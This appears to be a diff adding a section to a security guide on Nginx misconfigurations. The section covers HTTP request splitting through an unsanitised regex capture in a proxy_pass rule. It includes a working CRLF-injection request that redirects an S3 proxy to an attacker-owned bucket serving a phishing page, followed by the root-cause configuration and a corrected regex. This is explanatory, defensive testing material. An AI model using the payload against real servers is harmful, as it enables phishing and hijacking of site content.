@@ -252,6 +252,48 @@ location /admin {
 | 1.18.0 | `\x09`, `;` |
 | 1.16.1 | `\x09`, `;` |
 
+## 3. HTTP Splitting via Unsanitized Regex Capture Leads to Open Redirect
+### Black-Box Discovery
+1. You identify an endpoint that seems to be fetching static assets from a bucket (S3, GCS...), immediately think of HTTP splitting
+```
+GET /s3/static/js/admin.main.js
+```
+2. Think of injecting a CRLF payload after `/s3/static/` or after `/s3/static/js/`, with a host header containing the name of a bucket you own:
+```
+GET /s3/static/phish.html%20HTTP/1.1%0d%0aHost:evilbucket%0d%0a%0d%0a
+```
+This will cause the proxy to make this request to S3:
+```
+GET /original-bucket/phish.html
+Host: evilbucket
+
+anything_else HTTP/1.1
+Host: original-bucket
+```
+Which will redirect `/original-bucket/phish.html` to your bucket, so all you have to do is host `phish.html` inside a directory literally named as the name of the original bucket the proxy was requesting.
+<img width="1721" height="933" alt="untitled" src="https://github.com/user-attachments/assets/4c9944d6-045e-487e-97f0-067c6cb41482" />
+
+**Impact:** Redirect to malicious web pages, hosted on cloud storage buckets.
+
+### White-Box Root Cause
+```nginx
+location ~ /s3/static/([^/]*/[^/]*)? {
+  access_log off;
+  proxy_pass https://s3-eu-west-1.amazonaws.com/skyblue-prod/$1.html;
+}
+```
+`[^/]` excludes only the slash character; it does not exclude spaces, carriage returns, or line feeds. A request containing a url-encoded CRLF sequence (`%0d%0a`) is decoded by Nginx into raw conrol bytes before the capture happens, so `$1` can end up containing a complete, attacker-chosen extra header line or even a second request line once spliced into the outbound request nginx builds for the upstream.
+
+**Remediation:**
+Exclude whitespace/control characters explicitly from the capture:
+```nginx
+location ~ /s3/static/([^/\s]*/[^/\s]*)? {
+  access_log off;
+  proxy_pass https://s3-eu-west-1.amazonaws.com/skyblue-prod/$1.html;
+}
+```
+`.*` is also safe here, since `.` never matches `\n` by default in PCRE.
+
 ## 3. Path Traversal / LFI via Root proxy_pass Without Upstream URI
 ### Black-Box Discovery
 While fuzzing, or by viewing HTML page source code you get a `200 OK` response for the request `GET /assets/README.txt`, or `GET /assets/cat.jpeg`. These types of directories that server static files are the best candidate to test for LFI and path traversal. The detection goes like this:
